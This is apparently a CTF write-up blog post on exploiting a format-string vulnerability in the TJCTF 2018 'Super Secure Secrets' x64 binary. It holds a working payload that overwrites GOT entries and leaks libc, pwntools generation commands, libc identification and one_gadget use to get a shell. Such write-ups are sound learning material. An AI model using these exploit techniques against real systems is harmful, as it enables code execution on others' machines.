---
layout: post
title: "[TJCTF:Super Secure Secrets] x64 formatstring"
comments: true
---

![](/assets/files/ctf/2018/tjctf/supersecuresecret.png)

* Orgs [link](https://tjctf.org/chals/list)
* [ctftime](https://ctftime.org/event/660)
* binary [backup](/assets/files/ctf/2018/tjctf/super_secure)

## The bug

The original vulnerability is the format string. 

![](/assets/files/ctf/2018/tjctf/fmt.png)

The protections are weak, so the task should not be very hard.

![](/assets/files/ctf/2018/tjctf/checksec.png)


## x64 format string

Originally the program provides only one read/write message, then exits. So the first step is to do leak of libc base and jump on the start of the program, to gain another format string bug execution.

The buffer is read by `fgets(a1, 0x80, stdin);` which can read zeroes from the input and have enough room to place payload! The only problem with fmt vuln exploit is that we need to place addresses after string itself.

Our first payload will look like this:

```
	b = ELF("./super_secure")

	ms = b.got["memset"]

	payload = "%3488c%33$hn%62112c%34$hn%65472c%35$hn%36$hn___%37$s----"
	payload += p64(ms) + p64(ms + 2) + p64(ms + 4) + p64(ms + 5)
	payload += p64(b.got["putchar"])
``` 

The first part can be generated with [pwn tools](https://docs.pwntools.com) like this:

```
>>> fmtstr_payload(33, {0x602050:0x400DA0}, write_size="short", numbwritten=-8*4)
'P `\x00\x00\x00\x00\x00R `\x00\x00\x00\x00\x00T `\x00\x00\x00\x00\x00V `\x00\x00\x00\x00\x00%3488c%33$hn%62112c%34$hn%65472c%35$hn%36$hn'
```

* `0x400DA0` it's `secure_service()` function
* `numbwritten=-8*4` it's our skipped bytes of addresses from the beginning
* `___%37$s----` is our leaking libc addr

## libc version

Up to now, we are successfully leaked `putchar()` form libc. We need to identify remote libc version. Let's use awesome [libc-database](https://github.com/niklasb/libc-database):

```
$ ./find putchar 0x7ff422f25810 
http://ftp.osuosl.org/pub/ubuntu/pool/main/g/glibc/libc6_2.27-3ubuntu1_amd64.deb (id libc6_2.27-3ubuntu1_amd64)
```

We can extract that .deb package to get proper libc.

## Putting it all together


Now we can patch `.got.plt` entries to libc, we can patch something to `system()` or use more general approach - [one_gadget](https://github.com/david942j/one_gadget).

![](/assets/files/ctf/2018/tjctf/one_gadget.png)

Finally we can run our [exploit](/assets/files/ctf/2018/tjctf/xpwn.py) to grab the flag.

```
tjctf{4r3_f0rm47_57r1n65_63771n6_0ld_y37?}
```

